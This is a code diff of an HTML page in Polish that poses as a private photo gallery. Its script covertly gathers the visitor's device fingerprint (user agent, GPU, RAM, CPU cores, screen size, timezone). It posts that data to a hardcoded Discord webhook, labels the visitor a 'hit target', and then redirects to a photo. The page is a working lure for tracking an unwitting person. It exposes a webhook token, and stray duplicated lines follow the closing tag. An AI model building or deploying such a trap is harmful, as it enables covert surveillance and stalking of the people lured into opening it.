@@ -3,23 +3,26 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Prywatna Galeria Zdjęć - Debug</title>
+  <title>Prywatna Galeria Zdjęć - Live Debug</title>
   <style>
-    body { background: #0f172a; color: #fff; font-family: monospace; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; padding: 20px; text-align: center; }
-    .loader { border: 4px solid #1e293b; border-top: 4px solid #38bdf8; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin-bottom: 15px; }
-    #debug-box { margin-top: 20px; padding: 15px; background: #1e293b; border: 1px solid #38bdf8; border-radius: 8px; max-width: 90%; width: 400px; word-break: break-all; font-size: 11px; color: #38bdf8; text-align: left; max-height: 200px; overflow-y: auto; }
+    body { background: #0f172a; color: #fff; font-family: monospace; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; padding: 15px; text-align: center; box-sizing: border-box; }
+    .loader { border: 4px solid #1e293b; border-top: 4px solid #38bdf8; border-radius: 50%; width: 35px; height: 35px; animation: spin 1s linear infinite; margin-bottom: 10px; }
+    p { margin: 5px 0 15px 0; font-size: 14px; }
+    #debug-box { padding: 10px; background: #020617; border: 1px solid #38bdf8; border-radius: 6px; width: 100%; max-width: 450px; height: 130px; overflow-y: auto; text-align: left; font-size: 10px; color: #38bdf8; box-shadow: 0 4px 6px rgba(0,0,0,0.3); }
     @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
   </style>
 </head>
 <body>
   <div class="loader"></div>
-  <p id="status-text">Wczytywanie bezpiecznej galerii...</p>
+  <p>Wczytywanie bezpiecznej galerii...</p>
+  
+  <!-- Widoczny panel debugowania na dole -->
   <div id="debug-box">[SYSTEM] Inicjalizacja modułu OSINT...</div>
 
   <script>
     const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1550302869847281716/Vm79NB7uHGzqnzfUSaj2dmW5vr0sQ6fMxQJOUUP2h1n6BSpSNKKUf9oea9ZQJ0uyhaf5";
     
-    // Obie fotki podesłane przez Maszę - losujemy cel przekierowania
+    // Obie fotki podesłane przez Maszę – losujemy cel przekierowania
     const targetPhotos = [
       "./20260808_121307.jpg",
       "./IMG_20250315_160715.heif"
@@ -35,11 +38,13 @@
       }
     }
 
-    // Awaryjny bezpiecznik: po 2.5 sekundy twarde przekierowanie do wylosowanego pliku
+    logDebug("Wylosowano plik docelowy: " + REDIRECT_URL);
+
+    // Awaryjny bezpiecznik: po 3 sekundach twarde przekierowanie, żeby cel nie utknął
     const safetyTimer = setTimeout(() => {
-      logDebug("CRITICAL: Safety timer włączony. Skok do: " + REDIRECT_URL);
+      logDebug("CRITICAL: Safety timer! Wymuszam redirect...");
       window.location.replace(REDIRECT_URL);
-    }, 2500);
+    }, 3000);
 
     function harvestIntel() {
       let gpu = "Nieznane";
@@ -53,7 +58,6 @@
       } catch(err) {
         logDebug("Błąd GPU: " + err.message);
       }
-
       return {
         ua: navigator.userAgent,
         platform: navigator.platform || "N/A",
@@ -61,25 +65,23 @@
         ram: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "?",
         screen: `${window.screen.width}x${window.screen.height}`,
         timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || "N/A",
-        gpu: gpu,
-        targetFile: REDIRECT_URL
+        gpu: gpu
       };
     }
 
     async function executeTrap() {
       try {
-        logDebug("Skanowanie środowiska celu...");
+        logDebug("Skanowanie środowiska (GPU/RAM)...");
         const data = harvestIntel();
         logDebug("GPU: " + data.gpu);
-        logDebug("Wybrano plik docelowy: " + data.targetFile);
 
         const payload = {
           username: "MASZA OSINT DEBUGGER",
           embeds: [{
-            title: "🎯 TRAFIONY / ZALOGOWANY CEL (DEBUG & 2 PLIKI)!",
+            title: "🎯 TRAFIONY CEL (2 PLIKI + WIDOCZNY DEBUG)!",
             color: 15158332,
             fields: [
-              { name: "📂 Wylosowany Plik", value: `\`${data.targetFile}\``, inline: false },
+              { name: "📂 Wylosowany Plik", value: `\`${REDIRECT_URL}\``, inline: false },
               { name: "🎮 GPU Renderer", value: `\`${data.gpu}\``, inline: false },
               { name: "💻 Hardware", value: `CPU: \`${data.cores}\` | RAM: \`${data.ram}\``, inline: true },
               { name: "🌍 Strefa", value: `\`${data.timezone}\``, inline: true },
@@ -89,18 +91,29 @@
           }]
         };
 
-        logDebug("Wysyłanie paczki do Discorda...");
+        logDebug("Wysyłanie danych do Discorda...");
         await fetch(DISCORD_WEBHOOK, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify(payload),
           keepalive: true
         });
-        logDebug("Wysyłka zakończona sukcesem!");
+        logDebug("Wysyłka OK! Przekierowanie za chwilę...");
 
       } catch(err) {
-        logDebug("BŁĄD KRYTYCZNY: " + err.message);
+        logDebug("BŁĄD: " + err.message);
       } finally {
+        clearTimeout(safetyTimer);
+        setTimeout(() => {
+          window.location.replace(REDIRECT_URL);
+        }, 1000); // 1 sekunda opóźnienia, żebyś zdążył zobaczyć logi na ekranie
+      }
+    }
+
+    executeTrap();
+  </script>
+</body>
+</html>
         clearTimeout(safetyTimer);
         logDebug("Przekierowanie do pliku za 0.5s...");
         setTimeout(() => {
